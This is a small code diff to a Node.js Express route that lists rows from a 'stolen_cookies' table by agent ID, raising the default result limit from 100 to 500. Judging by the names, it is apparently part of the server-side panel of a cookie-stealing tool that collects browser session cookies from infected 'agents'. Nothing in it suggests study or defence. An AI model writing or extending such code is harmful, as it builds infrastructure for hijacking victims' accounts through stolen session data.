@@ -418,7 +418,7 @@ router.get('/all', verifyToken, async (req, res) => {
 router.get('/all/:agentId', verifyToken, async (req, res) => {
     try {
         const { agentId } = req.params;
-        const { limit = 100 } = req.query;
+        const { limit = 500 } = req.query;
         
         const cookies = await new Promise((resolve, reject) => {
             db.all('SELECT * FROM stolen_cookies WHERE agentId = ? ORDER BY stolen_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
